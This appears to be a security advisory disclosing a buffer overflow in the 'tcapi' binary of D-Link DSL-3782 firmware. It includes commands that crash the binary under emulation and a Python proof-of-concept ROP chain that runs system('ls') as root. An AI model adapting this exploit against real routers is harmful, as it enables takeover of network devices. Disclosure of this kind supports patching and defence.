### D-Link DSL-3782 Code execution

The buffer overflow vulnerability was found in the "/userfs/bin/tcapi" binary which is used as a wrapper for the "Diagnostics" functionality in the Web GUI.

An authenticated user can pass a long buffer as an 'read' parameter to the '/user/bin/tcapi' binary using 'read <node_name>' function and cause the memory corruption. Furthermore, it is possible to redirect the flow of the program and execute an arbitrary code.

The vulnerability can be triggered as follows:
<br>
```
$ sudo chroot . ./qemu userfs/bin/tcapi 
set
unset
get
show
commit
save
read
readAll
staticGet
```
```
$ sudo chroot . ./qemu userfs/bin/tcapi read
read <node_name>
```

Program Segmentation fault：
```
$ sudo chroot . ./qemu userfs/bin/tcapi read Aa0Aa1Aa2Aa3Aa4Aa5A
a6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av
```

We have a full control over the return address along with a few other registers.
Full ROP chain used to execute 'system("ls");' as root user can be crafted as follows: (ASLR has been disabled for testing purposes.)
```
#!/usr/bin/envpython
import sys
import struct

libc =0x7671B000

s0=struct.pack(">I",0x76774BB0)#system
s1=struct.pack(">I",0x41414141)#useless
s2=struct.pack(">I",0x43434343)#useless
s3=struct.pack(">I",0x44444444)#useless
ra=struct.pack(">I",0x7673156C)#godget1

x="A"*644+s0+s1+ra+"a"*16+"ls"
```
